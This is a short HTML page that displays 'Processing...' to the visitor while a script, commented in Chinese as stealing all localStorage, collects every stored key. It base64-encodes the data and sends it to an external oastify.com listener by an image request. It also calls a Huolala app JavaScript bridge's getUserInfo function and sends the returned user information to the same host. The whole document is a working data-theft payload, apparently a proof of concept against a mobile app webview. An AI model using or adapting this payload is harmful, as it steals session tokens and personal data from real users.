<!DOCTYPE html>
<html>
<body>
  <h2>Processing...</h2>
  <script>
    // 1. 窃取所有 localStorage
    const leak = {};
    for (let key in localStorage) {
      leak[key] = localStorage.getItem(key);
    }

    // 2. 编码为 URL 参数（避免特殊字符问题）
    const params = new URLSearchParams();
    params.append('data', btoa(unescape(encodeURIComponent(JSON.stringify(leak)))));

    // 3. 用 <img> 发送（GET 请求）
    const img = new Image();
    img.src = 'http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/leak?' + params.toString();

    // 4. 可选：也尝试 JSBridge
    if (window.HuolalaJSBridge?.getUserInfo) {
      HuolalaJSBridge.getUserInfo((res) => {
        const img2 = new Image();
        img2.src = 'http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/bridge?' + 
                   new URLSearchParams({ bridge: JSON.stringify(res) });
      });
    }
  </script>
</body>
</html>
